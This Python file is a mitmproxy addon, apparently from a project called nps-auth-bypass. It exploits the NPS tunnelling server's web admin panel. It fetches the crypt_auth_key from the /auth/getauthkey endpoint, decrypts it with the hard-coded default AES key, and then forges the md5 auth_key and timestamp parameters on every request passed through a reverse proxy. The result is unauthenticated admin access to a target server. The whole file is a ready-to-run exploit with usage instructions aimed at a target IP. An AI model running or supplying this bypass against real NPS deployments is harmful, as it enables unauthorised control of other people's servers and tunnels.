# -*- encoding:utf-8 -*-
"""
@使用方法:
mitmdump -s main.py -p 8000 --mode reverse:http://x.x.x.x:x/
浏览器访问 http://127.0.0.1:8000/

@项目地址:
https://github.com/carr0t2/nps-auth-bypass

"""
import time
import hashlib
import mitmproxy.http
import mitmproxy.addonmanager
import requests
from Crypto.Cipher import AES


class NpsHack:
    def __init__(self):
        self.config_auth_key = ''  # 默认配置为空 假如某个不为空可以自己添加

    @staticmethod
    def md5(s: str) -> str:
        m = hashlib.md5()
        m.update(s.encode())
        return m.hexdigest()

    def load(self, loader: mitmproxy.addonmanager.Loader):
        try:
            # 对应只修改了配置中auth_key 未修改auth_crypt_key的情况
            # 具体api内容见官方文档
            # https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/docs/api.md#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E7%AB%AFauthkey
            url = loader.master.options.mode[8:].rstrip('/')
            burp0_url = url + '/auth/getauthkey'
            r = requests.get(burp0_url, timeout=2)
            crypt_auth_key = r.json()['crypt_auth_key']
            defaul_aes_key = b'1234567812345678'
            b_key = bytes.fromhex(crypt_auth_key)
            enc = AES.new(key=defaul_aes_key, mode=AES.MODE_CBC, iv=defaul_aes_key)
            config_auth_key = enc.decrypt(b_key).decode()
            config_auth_key = config_auth_key[0:-ord(config_auth_key[-1])]  # 去填充
            self.config_auth_key = config_auth_key
            print('成功获取config_auth_key', config_auth_key)
        except Exception as e:
            print(e)

    def request(self, flow: mitmproxy.http.HTTPFlow):
        r = flow.request
        now_timestamp = str(int(time.time()))
        auth_key = self.md5(self.config_auth_key + now_timestamp)
        r.query.set_all('auth_key', [auth_key])
        r.query.set_all('timestamp', [now_timestamp])
        flow.request = flow.request.make(
            method=r.method,
            url=r.url,
            content=r.raw_content,
            headers=r.headers
        )


addons = [NpsHack()]
